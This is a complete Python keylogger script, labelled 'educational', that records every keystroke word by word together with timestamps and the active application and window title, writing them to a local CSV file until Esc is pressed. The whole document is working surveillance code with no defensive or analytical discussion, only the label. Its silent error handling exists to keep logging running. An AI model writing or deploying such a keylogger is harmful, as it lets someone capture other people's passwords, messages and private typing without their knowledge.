from pynput import keyboard
from datetime import datetime
import csv
import os
import platform

# Try to import libraries for capturing active window (Windows only)
try:
    if platform.system() == "Windows":
        import win32gui
        import win32process
        import psutil
        CAPTURE_APP = True
    else:
        CAPTURE_APP = False
except ImportError:
    CAPTURE_APP = False
    print("Note: Install 'pywin32' and 'psutil' to capture active application name")
    print("Run: pip install pywin32 psutil")

# Define the CSV file where logs will be saved
log_file = "key_log.csv"

# Buffer to accumulate words
word_buffer = ""

def get_active_window():
    """Gets the name of the active application/window (Windows only)"""
    if not CAPTURE_APP:
        return "N/A"
    
    try:
        # Get the active window
        window = win32gui.GetForegroundWindow()
        # Get the window title
        window_title = win32gui.GetWindowText(window)
        # Get the process PID
        _, pid = win32process.GetWindowThreadProcessId(window)
        # Get the process name
        process = psutil.Process(pid)
        app_name = process.name()
        
        return f"{app_name} - {window_title}" if window_title else app_name
    except Exception:
        return "Unknown"

def save_to_csv(text, is_special_key=False):
    """Saves the text to CSV file with date, time, and application"""
    try:
        now = datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")
        application = get_active_window()
        
        # Create file with headers if it doesn't exist
        file_exists = os.path.isfile(log_file)
        
        with open(log_file, "a", newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # Write headers if it's a new file
            if not file_exists:
                writer.writerow(["Date", "Time", "Key/Word", "Application"])
            
            # Write the record
            writer.writerow([date, time, text, application])
    except PermissionError:
        # If file is open in another program, skip this save
        pass
    except Exception:
        # Ignore any other errors to keep the keylogger running
        pass

def on_press(key):
    global word_buffer
    
    try:
        # Normal key (letter, number, symbol)
        word_buffer += key.char
        
    except AttributeError:
        # Special key
        try:
            if key == keyboard.Key.space:
                # Space: save accumulated word
                if word_buffer.strip():
                    save_to_csv(word_buffer)
                    word_buffer = ""
                # Also log the space
                save_to_csv("[SPACE]", is_special_key=True)
                
            elif key == keyboard.Key.enter:
                # Enter: save word and enter
                if word_buffer.strip():
                    save_to_csv(word_buffer)
                    word_buffer = ""
                save_to_csv("[ENTER]", is_special_key=True)
                
            elif key == keyboard.Key.backspace:
                # Backspace: remove last character from buffer
                if word_buffer:
                    word_buffer = word_buffer[:-1]
                save_to_csv("[BACKSPACE]", is_special_key=True)
                
            elif key == keyboard.Key.tab:
                # Tab: save word and log tab
                if word_buffer.strip():
                    save_to_csv(word_buffer)
                    word_buffer = ""
                save_to_csv("[TAB]", is_special_key=True)
                
            else:
                # Other special keys (Ctrl, Alt, Shift, etc.)
                key_name = str(key).replace("Key.", "").upper()
                save_to_csv(f"[{key_name}]", is_special_key=True)
        except Exception:
            # Ignore any errors with special keys
            pass

def on_release(key):
    global word_buffer
    
    # Stop the script with Esc
    if key == keyboard.Key.esc:
        # Save any pending word before exiting
        if word_buffer.strip():
            save_to_csv(word_buffer)
        print("\n--- Keylogger stopped ---")
        return False

# Startup message
print("=== EDUCATIONAL KEYLOGGER STARTED ===")
print(f"Saving to: {os.path.abspath(log_file)}")
print("Press ESC to stop the keylogger")
print("Capture mode: WORD BY WORD with timestamp and active application")
print("-" * 50)

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()